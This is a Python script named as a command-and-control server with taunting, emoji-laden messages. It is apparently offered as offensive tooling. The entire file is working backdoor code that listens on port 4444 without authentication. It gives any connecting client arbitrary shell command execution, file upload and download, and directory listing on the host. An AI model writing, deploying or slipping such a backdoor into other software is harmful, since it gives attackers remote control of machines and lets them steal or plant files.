import socket
import os
import subprocess
import threading
import shutil

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] C2 Server listening on {self.host}:{self.port} 😈")

    def handle_client(self, client_socket):
        print(f"[*] New connection from {client_socket.getpeername()} 🤡")
        while True:
            try:
                command = client_socket.recv(1024).decode().strip()
                if not command:
                    break

                if command.lower() == "exit":
                    client_socket.send(b"Goodbye, you pathetic worm. 😈")
                    break

                elif command.lower() == "shell":
                    client_socket.send(b"[*] Entering shell mode. Type 'exit' to quit. 🐍")
                    while True:
                        shell_cmd = client_socket.recv(1024).decode().strip()
                        if shell_cmd.lower() == "exit":
                            break
                        try:
                            output = subprocess.check_output(shell_cmd, shell=True, stderr=subprocess.STDOUT)
                            client_socket.send(output)
                        except Exception as e:
                            client_socket.send(f"Error: {str(e)}".encode())

                elif command.lower() == "upload":
                    client_socket.send(b"[*] Send file path to upload.")
                    file_path = client_socket.recv(1024).decode().strip()
                    with open(file_path, 'wb') as f:
                        while True:
                            data = client_socket.recv(1024)
                            if data.endswith(b"EOF"):
                                f.write(data[:-3])
                                break
                            f.write(data)
                    client_socket.send(b"[*] File uploaded successfully. 😈")

                elif command.lower() == "download":
                    client_socket.send(b"[*] Send file path to download.")
                    file_path = client_socket.recv(1024).decode().strip()
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as f:
                            while True:
                                data = f.read(1024)
                                if not data:
                                    client_socket.send(b"EOF")
                                    break
                                client_socket.send(data)
                    else:
                        client_socket.send(b"[!] File not found. 😤")

                elif command.lower() == "list":
                    files = os.listdir()
                    client_socket.send(str(files).encode())

                else:
                    client_socket.send(b"[!] Unknown command. Try 'shell', 'upload', 'download', or 'list'. 🤡")

            except Exception as e:
                print(f"[!] Error: {str(e)} 💀")
                break

        client_socket.close()
        print(f"[*] Connection closed with {client_socket.getpeername()} 🔥")

    def start(self):
        while True:
            client_socket, addr = self.server.accept()
            client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_thread.start()

if __name__ == "__main__":
    server = C2Server()
    server.start()
